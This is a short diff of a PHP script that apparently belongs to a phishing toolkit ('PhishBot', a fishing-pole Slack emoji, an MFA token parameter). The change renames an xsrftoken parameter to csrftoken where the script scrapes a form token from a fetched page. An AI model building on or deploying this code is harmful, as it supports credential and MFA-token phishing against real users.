@@ -12,9 +12,9 @@ if(isset($_REQUEST['token'])){$MFAToken = $_REQUEST['token'];}else{$MFAToken = "
 if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}else{$slackemoji = ":fishing_pole_and_fish:";}
 if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}else{$slackbotname = "PhishBot";}
 
-// This code retrieves the XSRF token if provided
-if(isset($_REQUEST['xsrftoken']) && $_REQUEST['xsrftoken'] != ""){
-	$xsrftoken = $_REQUEST['xsrftoken'];
+// This code retrieves the csrf token if provided
+if(isset($_REQUEST['csrftoken']) && $_REQUEST['csrftoken'] != ""){
+	$csrftoken = $_REQUEST['csrftoken'];
 	$redirurl = $_REQUEST['redirurl'];
 	
 $curl = curl_init();
@@ -52,7 +52,7 @@ $arr = explode("\n", $response);
   
 
 
-$matchingvalue = 'name="'.$xsrftoken.'"';
+$matchingvalue = 'name="'.$csrftoken.'"';
 
 
 $content_before_string = strstr($response, $matchingvalue, true);
